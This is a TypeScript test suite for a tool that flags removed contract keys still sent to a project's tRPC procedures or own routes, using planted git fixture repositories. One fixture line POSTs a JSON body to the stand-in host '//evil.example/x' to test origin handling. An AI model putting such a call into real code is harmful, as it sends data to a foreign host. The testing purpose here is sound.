// `pnpm unwired removed-keys` fails a deletion branch only on a site the key resolver places on the shape the key was
// removed from, or on a key of a loose object that flows into one of our procedures. A same-named field of another
// shape is someone else's, and a body sent outside the repo is listed as unresolved, never failed on. A destination is
// the resolved callee: a tRPC verb the tRPC packages declare, a TanStack mutation built from a procedure, or a `fetch`
// whose URL, through a route constant, is a path on our own origin.
import { mkdirSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { expect, plantedTsconfig, test } from "@orb/testkit/tooling";
import { execFixtureGit, FIXTURE_GIT_IDENTITY } from "@orb/tooling/floor/git/git-fixture";
import { NO_DESTINATION, NO_KEY_POSITION, OUTSIDE_PROGRAM } from "../../../tooling/src/unwired/graph/removed-keys.ts";
import type { RemovedKeysReport } from "../../../tooling/src/unwired/index.ts";
import { removedKeysGraph } from "../../../tooling/src/unwired/index.ts";
import { graphTree, LIB, WORLD, ZOD_STUB } from "./_planted.ts";

// The e2e suites are a world of their own, as in the real solution; the DOM lib declares `fetch`, so a route call
// resolves to the platform's as the client's does.
const E2E_WORLD = "tests/tsconfig.json";
const CONTRACT = "packages/contracts/src/chat/send.ts";
const BEFORE = [
  'import { z } from "../z.ts";',
  "export interface SendInput {",
  "  readonly chatId: string;",
  "  readonly guidedPick?: string;",
  "}",
  "export interface EditInput {",
  "  readonly guidedPick?: string;",
  "}",
  "export const listInputSchema = z.object({ limit: z.string(), pageLimit: z.string().optional() });",
].join("\n");
const AFTER = [
  'import { z } from "../z.ts";',
  "export interface SendInput {",
  "  readonly chatId: string;",
  "}",
  "export interface EditInput {",
  "  readonly guidedPick?: string;",
  "}",
  "export const listInputSchema = z.object({ limit: z.string() });",
].join("\n");

// The tRPC packages' procedure verbs and TanStack's mutation, declared where the real ones are, so a call resolves to them:
// the client's proxy declares `mutate`, and its TanStack options proxy declares the options builders.
const PACKAGES = {
  "node_modules/@trpc/client/package.json": '{ "name": "@trpc/client", "types": "index.d.ts" }',
  "node_modules/@trpc/client/index.d.ts": "export interface MutationProcedure<I> { mutate(input: I): Promise<void> }",
  "node_modules/@trpc/tanstack-react-query/package.json": '{ "name": "@trpc/tanstack-react-query", "types": "index.d.ts" }',
  "node_modules/@trpc/tanstack-react-query/index.d.ts": [
    'import type { MutationProcedure as ClientProcedure } from "@trpc/client";',
    "export interface MutationProcedure<I> extends ClientProcedure<I> { mutationOptions(): { readonly input?: I } }",
    "export interface QueryProcedure<I> { queryOptions(input: I): unknown }",
  ].join("\n"),
  "node_modules/@tanstack/react-query/package.json": '{ "name": "@tanstack/react-query", "types": "index.d.ts" }',
  "node_modules/@tanstack/react-query/index.d.ts": [
    "export interface UseMutationResult<V> { mutate(variables: V): void; mutateAsync(variables: V): Promise<void> }",
    "export declare function useMutation<V>(options: { readonly input?: V }): UseMutationResult<V>;",
  ].join("\n"),
};

// The client's tRPC proxy, typed by procedure as the real one is.
const TRPC = [
  'import type { MutationProcedure, QueryProcedure } from "@trpc/tanstack-react-query";',
  "type Loose = Readonly<Record<string, unknown>>;",
  "export declare const trpc: {",
  "  readonly chat: {",
  "    readonly send: MutationProcedure<{ readonly chatId: string; readonly intent?: Loose }>;",
  "    readonly list: QueryProcedure<Loose>;",
  "    readonly edit: MutationProcedure<Loose>;",
  "  };",
  "};",
].join("\n");

const commit = (repo: string, files: Readonly<Record<string, string>>, message: string): void => {
  for (const [file, text] of Object.entries(files)) {
    mkdirSync(dirname(join(repo, file)), { recursive: true });
    writeFileSync(join(repo, file), text);
    execFixtureGit(repo, ["add", file]);
  }
  execFixtureGit(repo, ["commit", "-qm", message]);
};

async function deletionBranch(plantedTree: (tree: Record<string, string>) => Promise<string>, senders: Readonly<Record<string, string>>): Promise<string> {
  const repo = await plantedTree({
    ...graphTree({}),
    "tsconfig.json": JSON.stringify({ files: [], references: [{ path: "packages/a" }, { path: E2E_WORLD }] }),
    [WORLD]: plantedTsconfig({ lib: [...LIB, "DOM"], include: ["../*/src"] }),
    // The merged program takes its options from the browser world's config, as the real tree's does.
    "tsconfig.world-browser.json": plantedTsconfig({ lib: [...LIB, "DOM"], include: [] }),
    [E2E_WORLD]: plantedTsconfig({ lib: [...LIB, "DOM"], include: ["e2e"] }),
    ...PACKAGES,
    "packages/contracts/src/z.ts": ZOD_STUB,
    [CONTRACT]: BEFORE,
    "packages/contracts/src/list.ts": "export interface ListInput { readonly guidedPick?: string }\n",
    "packages/client/src/trpc.ts": TRPC,
    "packages/client/src/send.ts": "export const send = 1;\n",
    "packages/showcase-plugins/src/main.ts": "export const plugin = 1;\n",
    "tests/e2e/send.spec.ts": "export const spec = 1;\n",
  });
  for (const args of [
    ["init", "-q", "-b", "main"],
    ["config", "user.email", FIXTURE_GIT_IDENTITY.email],
    ["config", "user.name", FIXTURE_GIT_IDENTITY.name],
    ["add", "-A"],
    ["commit", "-qm", "base"],
    ["switch", "-q", "-c", "deletion"],
  ]) {
    execFixtureGit(repo, args);
  }
  commit(repo, { [CONTRACT]: AFTER, ...senders }, "remove guidedPick and pageLimit");
  return repo;
}

const check = async (repo: string): Promise<RemovedKeysReport> => await removedKeysGraph({ root: repo, base: "main", head: "HEAD" }, () => undefined);
const entry = (report: RemovedKeysReport, key: string): RemovedKeysReport["removed"][number] | undefined =>
  report.removed.find((removed) => removed.key === key);

test("a write the resolver places on the shape that dropped the key fails the branch, in an interface and a schema", { timeout: 120_000 }, async ({
  plantedTree,
}) => {
  const repo = await deletionBranch(plantedTree, {
    "packages/client/src/send.ts": [
      'import type { SendInput } from "../../contracts/src/chat/send.ts";',
      "export const send = { chatId: 'c', guidedPick: 'g' } as SendInput;",
    ].join("\n"),
    "packages/showcase-plugins/src/main.ts": [
      'import type { Infer } from "../../contracts/src/z.ts";',
      'import type { listInputSchema } from "../../contracts/src/chat/send.ts";',
      "export const list = { limit: '1', pageLimit: '3' } as Infer<typeof listInputSchema>;",
    ].join("\n"),
  });
  const report = await check(repo);
  expect(report.failed).toBe(true);
  expect(entry(report, "guidedPick")?.homes).toEqual([`${CONTRACT}:SendInput`]);
  expect(entry(report, "guidedPick")?.senders.map(({ receiver, at }) => `${receiver} ${at}`)).toEqual(["client packages/client/src/send.ts:2"]);
  expect(entry(report, "pageLimit")?.senders.map(({ receiver, at }) => `${receiver} ${at}`)).toEqual(["plugins packages/showcase-plugins/src/main.ts:3"]);
  expect(report.scanned).toEqual({ client: 2, plugins: 1, e2e: 1 });
});

test("a same-named field of another shape is another member, and passes", { timeout: 120_000 }, async ({ plantedTree }) => {
  const repo = await deletionBranch(plantedTree, {
    "packages/client/src/send.ts": [
      'import type { ListInput } from "../../contracts/src/list.ts";',
      "interface SourceInit { readonly pageLimit?: number }",
      "const init: SourceInit = { pageLimit: 3 };",
      "export const limit = init.pageLimit;",
      "export const list: ListInput = { guidedPick: 'g' };",
    ].join("\n"),
  });
  const report = await check(repo);
  expect(report.removed.map(({ key, senders, loose, other }) => `${key} ${senders.length} ${loose.length} ${other}`)).toEqual([
    "guidedPick 0 0 1",
    "pageLimit 0 0 3",
  ]);
  expect(report.failed).toBe(false);
});

// The kept twin sits in the same contract file as the shape that dropped the key, so only the home's span tells them apart.
test("a write of the key on a same-file shape that kept it is another member, and passes", { timeout: 120_000 }, async ({ plantedTree }) => {
  const repo = await deletionBranch(plantedTree, {
    "packages/client/src/send.ts": [
      'import type { EditInput } from "../../contracts/src/chat/send.ts";',
      "export const edit: EditInput = { guidedPick: 'g' };",
    ].join("\n"),
  });
  const report = await check(repo);
  const guidedPick = entry(report, "guidedPick");
  expect(guidedPick?.homes).toEqual([`${CONTRACT}:SendInput`]);
  expect([guidedPick?.senders.length, guidedPick?.other]).toEqual([0, 1]);
  expect(report.failed).toBe(false);
});

test("a key moved to another declaration fails a sender of its old home only", { timeout: 120_000 }, async ({ plantedTree }) => {
  const repo = await deletionBranch(plantedTree, {
    "packages/client/src/send.ts": [
      'import type { SendInput } from "../../contracts/src/chat/send.ts";',
      'import type { ListInput } from "../../contracts/src/list.ts";',
      "export const moved: ListInput = { guidedPick: 'g' };",
      "export const stale = { chatId: 'c', guidedPick: 'g' } as SendInput;",
    ].join("\n"),
  });
  const guidedPick = entry(await check(repo), "guidedPick");
  expect(guidedPick?.senders.map(({ at }) => at)).toEqual(["packages/client/src/send.ts:4"]);
  expect(guidedPick?.other).toBe(1);
});

test("a declaration moved out of the contracts with its keys removes none of them; a deletion beside it still reports", { timeout: 120_000 }, async ({
  plantedTree,
}) => {
  const moved = "packages/server/src/domain/chat/contract/edit.ts";
  const repo = await deletionBranch(plantedTree, {
    [CONTRACT]: AFTER.replace("export interface EditInput {\n  readonly guidedPick?: string;\n}\n", ""),
    [moved]: "export interface EditInput {\n  readonly guidedPick?: string;\n}\n",
  });
  expect(entry(await check(repo), "guidedPick")?.homes).toEqual([`${CONTRACT}:SendInput`]);
});

test("a key respelled as a computed constant, local or imported, is still declared; a deletion beside it still reports", { timeout: 120_000 }, async ({
  plantedTree,
}) => {
  const respelled = AFTER.replace("  readonly guidedPick?: string;\n}\nexport const", "  readonly [GUIDED_PICK]?: string;\n}\nexport const")
    .replace("z.object({ limit: z.string() })", "z.object({ [LIMIT]: z.string() })")
    .replace('import { z } from "../z.ts";', 'import { z } from "../z.ts";\nimport { GUIDED_PICK } from "./keys.ts";\nconst LIMIT = "limit";');
  const repo = await deletionBranch(plantedTree, {
    [CONTRACT]: respelled,
    "packages/contracts/src/chat/keys.ts": 'export const GUIDED_PICK = "guidedPick";\n',
  });
  const report = await check(repo);
  expect(entry(report, "guidedPick")?.homes).toEqual([`${CONTRACT}:SendInput`]);
  expect(entry(report, "limit")).toBeUndefined();
  expect(entry(report, "pageLimit")?.homes).toEqual([`${CONTRACT}:listInputSchema`]);
});

test("a body sent to an outside API is unresolved and passes", { timeout: 120_000 }, async ({ plantedTree }) => {
  const repo = await deletionBranch(plantedTree, {
    "packages/showcase-plugins/src/main.ts": [
      "declare function postJson(url: string, body: Readonly<Record<string, unknown>>): Promise<unknown>;",
      "export const sent = postJson('https://api.example.com/v1', { guidedPick: 'g' });",
    ].join("\n"),
  });
  const report = await check(repo);
  expect(entry(report, "guidedPick")?.unresolved.map(({ at, reason }) => `${at} ${reason}`)).toEqual([
    `packages/showcase-plugins/src/main.ts:2 ${NO_DESTINATION}`,
  ]);
  expect(report.failed).toBe(false);
});

test("a loose object handed to one of our procedures is a loose sender and fails; one sent outside passes", { timeout: 120_000 }, async ({ plantedTree }) => {
  const sender = [
    'import { trpc } from "../../packages/client/src/trpc.ts";',
    "export async function drive(): Promise<void> {",
    "  const intent: Record<string, unknown> = {};",
    '  intent["guidedPick"] = "g";',
    "  await trpc.chat.send.mutate({ chatId: 'c', ...(Object.keys(intent).length === 0 ? {} : { intent }) });",
    "}",
  ].join("\n");
  const outside = [
    "export async function report(): Promise<void> {",
    "  const intent: Record<string, unknown> = {};",
    '  intent["guidedPick"] = "g";',
    "  await fetch('https://elsewhere.example/report', { method: 'POST', body: JSON.stringify(intent) });",
    // A protocol-relative URL names another origin, never our own route.
    "  const relative: Record<string, unknown> = {};",
    '  relative["guidedPick"] = "g";',
    "  await fetch('//evil.example/x', { method: 'POST', body: JSON.stringify(relative) });",
    "}",
  ].join("\n");
  const failing = await check(await deletionBranch(plantedTree, { "tests/e2e/send.spec.ts": sender }));
  expect(entry(failing, "guidedPick")?.loose.map(({ at, destination }) => `${at} ${destination}`)).toEqual(["tests/e2e/send.spec.ts:4 trpc chat.send"]);
  expect(failing.failed).toBe(true);
  const passing = await check(await deletionBranch(plantedTree, { "tests/e2e/send.spec.ts": outside }));
  expect(entry(passing, "guidedPick")?.loose).toEqual([]);
  expect(entry(passing, "guidedPick")?.unresolved.map(({ at, reason }) => `${at} ${reason}`)).toEqual([
    `tests/e2e/send.spec.ts:3 ${NO_DESTINATION}`,
    `tests/e2e/send.spec.ts:6 ${NO_DESTINATION}`,
  ]);
  expect(passing.failed).toBe(false);
});

// A loose body in each spelling the client sends to our server, one per file, and a same-named method on a store.
const LOOSE = [
  "export const loose = (): Record<string, unknown> => {",
  "  const body: Record<string, unknown> = {};",
  '  body["guidedPick"] = "g";',
  "  return body;",
  "};",
].join("\n");
const SENDS = {
  "packages/client/src/loose.ts": LOOSE,
  "packages/client/src/route.ts": [
    'const SEND_ROUTE = "/api/chat/send";',
    'const ROUTES = { upload: "/api/upload" } as const;',
    "export async function post(): Promise<void> {",
    "  const body: Record<string, unknown> = {};",
    '  body["guidedPick"] = "g";',
    "  await fetch(SEND_ROUTE, { method: 'POST', body: JSON.stringify(body) });",
    "  const part: Record<string, unknown> = {};",
    '  part["guidedPick"] = "g";',
    // biome-ignore lint/suspicious/noTemplateCurlyInString: the planted source spells a template literal URL.
    "  await fetch(`${ROUTES.upload}/part`, { method: 'POST', body: JSON.stringify(part) });",
    "}",
    // A window member, a concatenated path and a choice of two routes are one fold's cases, each read to its paths.
    "export async function more(id: string, draft: boolean): Promise<void> {",
    "  const named: Record<string, unknown> = {};",
    '  named["guidedPick"] = "g";',
    "  await window.fetch('/api/chat/' + id, { method: 'POST', body: JSON.stringify(named) });",
    "  const chosen: Record<string, unknown> = {};",
    '  chosen["guidedPick"] = "g";',
    "  await fetch(draft ? '/api/draft' : SEND_ROUTE, { method: 'POST', body: JSON.stringify(chosen) });",
    "}",
    // A platform Request carries its body to the route its URL names, as a fetch's init does.
    "export async function requested(): Promise<void> {",
    "  const req: Record<string, unknown> = {};",
    '  req["guidedPick"] = "g";',
    "  await fetch(new Request(SEND_ROUTE, { method: 'POST', body: JSON.stringify(req) }));",
    "}",
  ].join("\n"),
  // A module's own function named `fetch` makes no platform request, whatever URL it takes.
  "packages/client/src/local-fetch.ts": [
    "function fetch(url: string, init: { readonly body: string }): void { void url; void init; }",
    "export function sent(): void {",
    "  const local: Record<string, unknown> = {};",
    '  local["guidedPick"] = "g";',
    "  fetch('/api/chat/send', { body: JSON.stringify(local) });",
    "}",
  ].join("\n"),
  "packages/client/src/query.ts": [
    'import { trpc } from "./trpc.ts";',
    "export function options(): unknown {",
    "  const input: Record<string, unknown> = {};",
    '  input["guidedPick"] = "g";',
    "  return trpc.chat.list.queryOptions(input);",
    "}",
  ].join("\n"),
  "packages/client/src/mutation.ts": [
    'import { useMutation } from "@tanstack/react-query";',
    'import { trpc } from "./trpc.ts";',
    "export function save(): void {",
    "  const edit = useMutation(trpc.chat.edit.mutationOptions());",
    "  const vars: Record<string, unknown> = {};",
    '  vars["guidedPick"] = "g";',
    "  edit.mutate(vars);",
    "}",
  ].join("\n"),
  "packages/client/src/store.ts": [
    "declare const app: { readonly store: { subscribe(state: Readonly<Record<string, unknown>>): void; query(state: Readonly<Record<string, unknown>>): void } };",
    "export function watch(): void {",
    "  const state: Record<string, unknown> = {};",
    '  state["guidedPick"] = "g";',
    "  app.store.subscribe(state);",
    "  app.store.query(state);",
    "}",
  ].join("\n"),
};

test("a loose body reaches our server through a route constant, a query's options and a procedure's mutation; a store's same-named method sends nowhere", {
  timeout: 120_000,
}, async ({ plantedTree }) => {
  const guidedPick = entry(await check(await deletionBranch(plantedTree, SENDS)), "guidedPick");
  expect(guidedPick?.loose.map(({ at, destination }) => `${at} ${destination}`).toSorted()).toEqual([
    "packages/client/src/mutation.ts:6 trpc chat.edit",
    "packages/client/src/query.ts:4 trpc chat.list",
    "packages/client/src/route.ts:13 http /api/chat/:*",
    "packages/client/src/route.ts:16 http /api/draft | /api/chat/send",
    "packages/client/src/route.ts:21 http /api/chat/send",
    "packages/client/src/route.ts:5 http /api/chat/send",
    "packages/client/src/route.ts:8 http /api/upload/part",
  ]);
  expect(guidedPick?.unresolved.map(({ at, reason }) => `${at} ${reason}`).toSorted()).toEqual([
    `packages/client/src/local-fetch.ts:4 ${NO_DESTINATION}`,
    `packages/client/src/loose.ts:3 ${NO_DESTINATION}`,
    `packages/client/src/store.ts:4 ${NO_DESTINATION}`,
  ]);
});

// A local binding that spells the key is no key site; a string of the key's text in no key slot is listed for a person.
test("a local binding named like the key is no site, and a plain string of its text is listed", { timeout: 120_000 }, async ({ plantedTree }) => {
  const repo = await deletionBranch(plantedTree, {
    "packages/client/src/send.ts": [
      "const guidedPick = 'g';",
      "export const read = guidedPick.length;",
      // The twin: the same text as a plain value sits in no key slot.
      "export const text = 'guidedPick';",
    ].join("\n"),
  });
  const guidedPick = entry(await check(repo), "guidedPick");
  expect(guidedPick?.unresolved.map(({ at, reason }) => `${at} ${reason}`)).toEqual([`packages/client/src/send.ts:3 ${NO_KEY_POSITION}`]);
  expect([guidedPick?.senders.length, guidedPick?.other]).toEqual([0, 0]);
});

// A `mutate` reaches one of our procedures only through TanStack's own mutation built from a tRPC `mutationOptions()`:
// the mutation and the options must each be declared by their package.
test("a same-named mutate on another receiver, or an options call another package declares, sends nowhere", { timeout: 120_000 }, async ({ plantedTree }) => {
  const sends = {
    "packages/client/src/real.ts": [
      'import { useMutation } from "@tanstack/react-query";',
      'import { trpc } from "./trpc.ts";',
      "export function save(): void {",
      "  const edit = useMutation(trpc.chat.edit.mutationOptions());",
      "  const vars: Record<string, unknown> = {};",
      '  vars["guidedPick"] = "g";',
      "  edit.mutate(vars);",
      "}",
    ].join("\n"),
    // A mutation hook of our own, not TanStack's, handed a real procedure's options.
    "packages/client/src/own-hook.ts": [
      'import { trpc } from "./trpc.ts";',
      "declare function useMutation<V>(options: { readonly input?: V }): { mutate(variables: V): void };",
      "export function save(): void {",
      "  const edit = useMutation(trpc.chat.edit.mutationOptions());",
      "  const vars: Record<string, unknown> = {};",
      '  vars["guidedPick"] = "g";',
      "  edit.mutate(vars);",
      "}",
    ].join("\n"),
    // TanStack's mutation over options some other package's object declares.
    "packages/client/src/other-options.ts": [
      'import { useMutation } from "@tanstack/react-query";',
      "declare const app: { readonly other: { mutationOptions(): { readonly input?: Readonly<Record<string, unknown>> } } };",
      "export function save(): void {",
      "  const edit = useMutation(app.other.mutationOptions());",
      "  const vars: Record<string, unknown> = {};",
      '  vars["guidedPick"] = "g";',
      "  edit.mutate(vars);",
      "}",
    ].join("\n"),
  };
  const guidedPick = entry(await check(await deletionBranch(plantedTree, sends)), "guidedPick");
  expect(guidedPick?.loose.map(({ at, destination }) => `${at} ${destination}`)).toEqual(["packages/client/src/real.ts:6 trpc chat.edit"]);
  expect(guidedPick?.unresolved.map(({ at, reason }) => `${at} ${reason}`).toSorted()).toEqual([
    `packages/client/src/other-options.ts:6 ${NO_DESTINATION}`,
    `packages/client/src/own-hook.ts:6 ${NO_DESTINATION}`,
  ]);
});

test("the check refuses a head other than the checked-out commit, and a working tree that differs from it", { timeout: 120_000 }, async ({ plantedTree }) => {
  const repo = await deletionBranch(plantedTree, {});
  await expect(removedKeysGraph({ root: repo, base: "main", head: "main" }, () => undefined)).rejects.toThrow("check out main first");
  expect((await check(repo)).failed).toBe(false);
  writeFileSync(join(repo, "packages/client/src/send.ts"), "export const send = { guidedPick: 'g' };\n");
  await expect(check(repo)).rejects.toThrow("differs from HEAD");
});

test("an untracked file no world loads lets the check run, and one the merged program loads refuses it", { timeout: 120_000 }, async ({ plantedTree }) => {
  const repo = await deletionBranch(plantedTree, {});
  mkdirSync(join(repo, ".deja"));
  writeFileSync(join(repo, ".deja/index.json"), '{ "guidedPick": "g" }\n');
  expect(entry(await check(repo), "guidedPick")?.homes).toEqual([`${CONTRACT}:SendInput`]);
  writeFileSync(join(repo, "packages/client/src/extra.ts"), "export const extra = { guidedPick: 'g' };\n");
  await expect(check(repo)).rejects.toThrow("packages/client/src/extra.ts");
});

test("a receiver file the merged program does not load is searched as text and listed unresolved, never passed", { timeout: 120_000 }, async ({
  plantedTree,
}) => {
  const report = await check(
    await deletionBranch(plantedTree, {
      "tests/e2e/fixture.json": '{ "guidedPick": "g" }\n',
      "tests/e2e/notes.md": "// guidedPick is gone\n",
    }),
  );
  expect(entry(report, "guidedPick")?.unresolved.map(({ at, reason }) => `${at} ${reason}`)).toEqual([`tests/e2e/fixture.json:1 ${OUTSIDE_PROGRAM}`]);
  expect(report.failed).toBe(false);
});
